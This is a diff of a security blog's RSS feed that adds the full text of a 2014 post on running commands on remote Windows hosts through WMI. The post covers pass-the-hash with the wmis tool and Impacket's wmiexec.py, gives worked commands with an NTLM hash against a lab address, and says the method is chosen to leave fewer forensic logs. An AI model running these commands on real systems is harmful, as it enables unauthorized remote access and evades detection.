@@ -8,7 +8,7 @@
     <language>en-us</language>
     <lastBuildDate>Sat, 19 Apr 2014 21:36:21 -0400</lastBuildDate>
     
-	<atom:link href="https://malicious.link/categories/wmis/index.xml" rel="self" type="application/rss+xml" />
+        <atom:link href="https://malicious.link/categories/wmis/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
@@ -17,8 +17,118 @@
       <pubDate>Sat, 19 Apr 2014 21:36:21 -0400</pubDate>
       
       <guid>https://malicious.link/post/2014/2014-04-19-executing-code-via-smb-without-psexec/</guid>
-      <description>PSEXEC has been a staple for Windows post exploitation pivoting and system administration for a long while. The basic premise of how all &amp;ldquo;psexec&amp;rdquo; tools work is:
- (Optional) Upload a service executable (PSEXECSVC.EXE in the case of SysInternal&amp;rsquo;s tool) to the ADMIN$ share Connect to the service manager on the remote host, and create a service based on either a local (to the remote system) executable or the uploaded one.</description>
+      <description>
+
+&lt;p&gt;PSEXEC has been a staple for Windows post exploitation pivoting and system administration for a long while. The basic premise of how all &amp;ldquo;psexec&amp;rdquo; tools work is:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;(&lt;em&gt;Optional&lt;/em&gt;) Upload a service executable (PSEXECSVC.EXE in the case of SysInternal&amp;rsquo;s tool) to the ADMIN$ share&lt;/li&gt;
+&lt;li&gt;Connect to the service manager on the remote host, and create a service based on either a local (to the remote system) executable or the uploaded one.&lt;/li&gt;
+&lt;li&gt;Run the service&lt;/li&gt;
+&lt;li&gt;Stop and delete the service and uploaded file pulling down the resulting output if any from the execution.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Now, as you can guess, the uploading of a file, creating, starting, stopping, and deletion of services create quite the logs and forensic evidence.&lt;/p&gt;
+
+&lt;p&gt;As you might imagine, thats not the best thing for us on the offensive side of infosec. Luckily big brother Microsoft provides another option, WMI (Windows Management Interface). I demonstrated the use of this in the past: &lt;a href=&#34;https://malicious.link/blog/2013/06/10/volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/&#34;&gt;HERE&lt;/a&gt; and &lt;a href=&#34;https://malicious.link/blog/2013/10/06/dumping-a-domain-worth-of-passwords-with-mimikatz/&#34;&gt;HERE&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;The downside to using the WMIC directly is that you need a valid token or a valid password for it to work. Passing the hash didn&amp;rsquo;t used to be an available option.&lt;/p&gt;
+
+&lt;p&gt;That has changed with the &amp;ldquo;wmis&amp;rdquo; package on Kali Linux that incorporates the &lt;a href=&#34;http://passing-the-hash.blogspot.com/2013/07/WMIS-PowerSploit-Shells.html&#34;&gt;&amp;ldquo;Pass-the-Hash for 15 years toolkit&amp;rdquo;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;(There is a slight problem where you have to play with it a bit to get it working on 64 bit Kali)&lt;/p&gt;
+
+&lt;p&gt;The other solution is supplied as an example in the &lt;a href=&#34;http://corelabs.coresecurity.com/index.php?module=Wiki&amp;amp;action=view&amp;amp;type=tool&amp;amp;name=Impacket&#34;&gt;Impacket library&lt;/a&gt; &lt;a href=&#34;https://code.google.com/p/impacket/source/browse/trunk/examples/wmiexec.py&#34;&gt;&amp;ldquo;wmiexec.py&amp;rdquo;&lt;/a&gt;. In my experience there are a few features that make it the better option.&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Installing it on a random VPS is dead simple and doesn&amp;rsquo;t need the Kali repos to get right, nor Debian/Ubuntu.&lt;/li&gt;
+&lt;li&gt;It defaults to an &amp;ldquo;semi-interactive shell&amp;rdquo; which writes and reads output from the ADMIN$ shell by default. Something I would normally have to do manually with a bunch of tools&lt;/li&gt;
+&lt;li&gt;As with the WMIS package, it allows you to just create a process without the ADMIN$ write/read.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Enough crazy talk here is an example usage of each:&lt;/p&gt;
+
+&lt;h2 id=&#34;wmis&#34;&gt;WMIS&lt;/h2&gt;
+
+&lt;h3 id=&#34;usage&#34;&gt;Usage:&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;root@wpad:~# wmis
+Usage: [-?NPV] [-?|--help] [--usage] [-d|--debuglevel=DEBUGLEVEL] [--debug-stderr] [-s|--configfile=CONFIGFILE]
+        [--option=name=value] [-l|--log-basename=LOGFILEBASE] [--leak-report] [--leak-report-full]
+        [-R|--name-resolve=NAME-RESOLVE-ORDER] [-O|--socket-options=SOCKETOPTIONS] [-n|--netbiosname=NETBIOSNAME]
+        [-W|--workgroup=WORKGROUP] [--realm=REALM] [-i|--scope=SCOPE] [-m|--maxprotocol=MAXPROTOCOL]
+        [-U|--user=[DOMAIN\]USERNAME[%PASSWORD]] [-N|--no-pass] [--password=STRING] [-A|--authentication-file=FILE]
+        [-S|--signing=on|off|required] [-P|--machine-pass] [--simple-bind-dn=STRING] [-k|--kerberos=STRING]
+        [--use-security-mechanisms=STRING] [-V|--version]
+        //host
+
+Example: wmis -U [domain/]adminuser%password //host cmd.exe /c dir c:\ &amp;gt; c:\windows\temp\output.txt 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;example&#34;&gt;Example:&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;root@wpad:~# wmis -U administrator%aad3b435b51404eeaad3b435b51404ee:88e4d9fabaecf3dec18dd80905521b29 //172.16.102.141 calc.exe
+HASH PASS: Substituting user supplied NTLM HASH...
+HASH PASS: Substituting user supplied NTLM HASH...
+[wmi/wmis.c:172:main()] 1: calc.exe
+NTSTATUS: NT_STATUS_OK - Success
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;wmiexec-py&#34;&gt;wmiexec.py&lt;/h2&gt;
+
+&lt;p&gt;Using a password, but with hashes you just tell it &lt;code&gt;-hashes&lt;/code&gt; :&lt;/p&gt;
+
+&lt;h3 id=&#34;usage-1&#34;&gt;Usage:&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;root@wpad:~/impacket/examples# ./wmiexec.py 
+Impacket v0.9.12-dev - Copyright 2002-2014 Core Security Technologies
+
+usage: wmiexec.py [-h] [-share SHARE] [-nooutput] [-hashes LMHASH:NTHASH]
+                  target [command [command ...]]
+
+positional arguments:
+  target                [domain/][username[:password]@]&amp;lt;address&amp;gt;
+  command               command to execute at the target. If empty it will
+                        launch a semi-interactive shell
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -share SHARE          share where the output will be grabbed from (default
+                        C$)
+  -nooutput             whether or not to print the output (no SMB connection
+                        created)
+
+authentication:
+  -hashes LMHASH:NTHASH
+                        NTLM hashes, format is LMHASH:NTHASH
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;example-1&#34;&gt;Example:&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;root@wpad:~/impacket/examples# ./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:88e4d9fabaecf3dec18dd80905521b29 administrator@172.16.102.141
+Impacket v0.9.12-dev - Copyright 2002-2014 Core Security Technologies
+
+SMBv2.1 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+C:\&amp;gt;dir
+ Volume in drive C has no label.
+ Volume Serial Number is 5CCA-B528
+
+ Directory of C:\
+
+07/13/2009  11:20 PM    &amp;lt;DIR&amp;gt;          PerfLogs
+10/07/2013  03:26 PM    &amp;lt;DIR&amp;gt;          Program Files
+07/14/2009  01:08 AM    &amp;lt;DIR&amp;gt;          Program Files (x86)
+04/25/2014  02:21 AM    &amp;lt;DIR&amp;gt;          Users
+05/11/2014  03:39 PM    &amp;lt;DIR&amp;gt;          Windows
+               0 File(s)              0 bytes
+               5 Dir(s)  52,884,389,888 bytes free
+
+C:\&amp;gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+</description>
     </item>
     
   </channel>
